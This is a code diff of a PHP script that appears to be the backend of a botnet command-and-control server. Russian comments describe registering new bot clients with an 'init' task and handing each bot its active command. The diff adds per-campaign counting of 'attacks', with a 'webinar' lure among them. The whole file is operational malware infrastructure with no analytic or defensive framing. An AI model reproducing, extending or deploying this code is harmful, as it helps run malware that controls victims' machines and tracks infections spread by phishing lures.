@@ -1,15 +1,7 @@
 <?php
 
-include ("cc/bd.php");
-$link = mysqli_init();
-$success = mysqli_real_connect(
-   $link, 
-   $host, 
-   $user, 
-   $password, 
-   $db,
-   $port
-);
+include ("/home/user-data/www/default/admin/cc/bd.php");
+mysqli_set_charset($link, "utf8");
 
 $cl = $_GET['i'];
 $client_id = mysqli_real_escape_string($link, $_GET['i']);
@@ -17,6 +9,10 @@ $command_id = mysqli_real_escape_string($link, $_GET['cid']);
 $part_id = mysqli_real_escape_string($link, $_GET['p']);
 $data = mysqli_real_escape_string($link, $_GET['d']);
 $final_part = mysqli_real_escape_string($link, $_GET['fin']);
+$attack_name = mysqli_real_escape_string($link, $_GET['name']);
+if($attack_name == 'webinar'){
+	$attack_name = 'Вебинар';
+}
 
 $data = str_replace(" ","+",$data);
 
@@ -56,6 +52,13 @@ if (!empty ($cl) &&  $command_id="woot")
 	{
 	//если с таким $client_id еще никого не было раньше, добавляем с таском init
 	$result = mysqli_query ($link,"INSERT INTO tasks(client_id, active_flag,operation,argument,argument_human,status) VALUES ('$client_id',1,'init','','',0) ");
+	$result1 = mysqli_query ($link, "SELECT * FROM attacks_stats WHERE attack_name = '$attack_name'");
+      while ($row = mysqli_fetch_array($result1, MYSQLI_NUM)){
+        $count = $row[1];
+        $new_count = $count + 1;
+      $result2 = mysqli_query ($link, "UPDATE attacks_stats SET count = '$new_count' WHERE attack_name = '$attack_name'");     
+      }
+    
 	}
 	
 	//едем дальше, боту нужно отдать активную команду.
